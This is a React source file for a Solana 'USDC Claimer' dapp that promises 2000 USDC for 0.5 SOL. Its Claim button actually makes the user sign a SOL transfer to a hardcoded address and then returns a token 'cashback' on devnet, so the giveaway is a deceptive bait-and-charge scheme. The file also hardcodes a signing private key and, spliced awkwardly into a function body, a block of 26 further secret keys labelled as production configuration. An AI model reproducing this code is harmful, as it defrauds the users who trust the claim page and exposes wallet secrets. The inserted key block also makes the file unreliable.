/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3tmSm1YZsw8nKwiw9FAgdvgiAxUMm26S2mPC7NnFQVeEd93ehjuswyhvwExh8697shbNGJWj3ChMz6S1rfc3RabE"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3sCsTS5BiakB9hxokaniZ4pFx7WSXtUrFEqGmDTwbSEphjrqb2BZ9rxHPvUimcrmWY4cSK14yLhQr736PErQeDNN",
  "key1": "3cWY1GMsHau14zTKNxEafnpeAe7MLkTEsdPXMyHrEpTjUDf2ccJpeyEZgdeoYyApwuCFHoEGHSM5JH4U4wU5mq7P",
  "key2": "3BkkC4rYpzfkhRKDPvDJpcvHA5zYzsEt9QmntoHcrFMVZsvizRRq5wBFpN8wFAcU75oGCyWbP7WVnTPgwxaxb9RY",
  "key3": "22Dkb6V1YenH5jNqYmRiDEvCRhVpZ4dj1MTHsvYYTVH6RPXFw5cMBKCC1WgAEGcixakLzPfqqxFuWxRg6MFTxdNQ",
  "key4": "t4f1ZjD7pexdbMFxEF9YsPuNp99s89CLeBjR6zLX59d7LmHkVftcqfwGut1bVNcJqsCmYbxK6seoJACEgJz6kzY",
  "key5": "5W1gvhAphqGCqTyzTmH7WT2KEeAus131Fyk6mEsxsPdLNuMkRMW28ZC1o7MXKAZoFoZjo6eHmoCFA7HqjyRP8VJy",
  "key6": "2rfWZ8duHgrVmjDkPzSGcUTCay3F1yu22R8zqX68cq8VcLw6yr6LnmnMnKiTzFAESY8kCbr1r7PTTNwv9LT3Xygc",
  "key7": "5k6trjsAvoEiCUwzQxaoMysAU3UCetVCNEUYowqPTDuLLwkhBmrrzBG6ac79Pvd3WfevZEib1mG5thHPW9jkDhXf",
  "key8": "21SfgXVZFyfJGLJFFv7Q9cY9sh9yaWMbmTi4GjV7PLTeJYahwKcrVwnf8aWQk4kRiHavAZfXXw56RmcW3sGaRyP1",
  "key9": "2EqGXm6aiKaTKHgUkmK5EEdbY9GcicNTegCUxbioPBwUG8AM6GLzc4thug8bLPrs9CZ9LmMLtoM7ZTtiSLFiqn2B",
  "key10": "5WruQh3H9M2LdqMbTwgviVoagR1Tuus4Cniz6RRmdKLm8qo75rxy5hdkeH4v831hZb1psLqhjCaHQvdaUK4zSJDt",
  "key11": "362C5kfZ2ee18yLgA5ZfAJu4TX4b5ficjEBUkNHCr14FTdicHsgYuRfm8jc57aRFJRi2WkeujHsBE911WMBWz7z6",
  "key12": "2hv5JVAwLjhsPKNY2CgqcFAhQGNfbcQeW6TizFbKZP8oZAKTYzyLtRsxVxpb961iqSDSqum4d9Y88YR2t2SdvxZD",
  "key13": "65KdWf2iDttAxxsmJYWxHYCqXfTTebuGMRrnVbXV5y2eBc9iZtDv5JQL3iqFtNk7hnHwgXspF7GJ97sJGM9399dh",
  "key14": "saXzpPHqBDDBMZGTQXSh9GBuXhFEKUJGLsUsZGpcy9aSMgyHxamoqq6oTjUqYKwwxiF6MR2rsHiW5WyWEr7kAjE",
  "key15": "dBYDEqjnjgnTLengrzCXiq53pygG1oQfhmBD1Hk3KCiaB1B4muTYn2YZyYE9dRKtzoRiMkwhWq5PG3VQqpazWiU",
  "key16": "5qZWwvHPqWyqoDTNx5S4LkYVSegF9Rm6GWfZQstvYxt9yZu4i38RKjeGiR7f8s5NvySLxNpZLHdQikwMw2eXkXaz",
  "key17": "34k4Z7qzXZpwpUce6iW1RrRAnJvhvf8nwBbMNNTHMaUQ412FeuHUrTKmBbAuG59ibW47k1tSd6uQ67HQSyQiLwKQ",
  "key18": "3qEtSDStNPTPoetTpHKndyTfu4nBUzUZza75kCZjx44ysZeaRQWcmBsgPQZFajnYqtgy72BhM4EQyEFBNHP8qPsQ",
  "key19": "2NUSY8fma8EcR15nSh3MDC1cSkvasrELXGBFE4V9MjA6brC8QjhPBzPpu2hUZNinhD6V7Y5wciDFdyx8LEDyW8Wk",
  "key20": "XzUJ9MGrJpAWQRuhM8QANDhh5NR5EtLF7Md5ePeV7oRAgLqxZtAaq1vzVvmpL28dR11b5vgLVuUwajVa6zTmptL",
  "key21": "2a9Pj9TbdLEi6Qv4v566s2qP5CS2DGHGreG5CiDwvDcXw4bNW1A8VqYqR7e675nxwJmj1BsuwtRRT6FeJp5Wms8N",
  "key22": "43yqMy4E1gGr1WoF6gHM6kCmqG4J6PF2agu6pUYRaxsoSJjF9JkpUUkGZ4nekVmmZL3vUQ4DwRsTVpm3ujAoQQPq",
  "key23": "5Fqv1M9nu3sagLoMeVMR7XPjVVLZRUD8iLiV743SQ2gzVXFe7R6YFJU8mNE51UJgDHx6HNvy7jXzpBGBLCiL12Qq",
  "key24": "4dKsyzqE8XDx7x3LNbgehtejBMobdKW9UvmzXB14kj4xwZr878a2MbixtQLNCmzsJo4VqbbFVkrfzj7Xo5hmm3Rz",
  "key25": "4sfLQRJrb4VJ3QFXzoFbaEYQNwkeYfgqR5CdQwk1U9UgsCJigKdh95sFEGgucgduYBpdxYNC3Zv9wmgFzD8mynP3"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
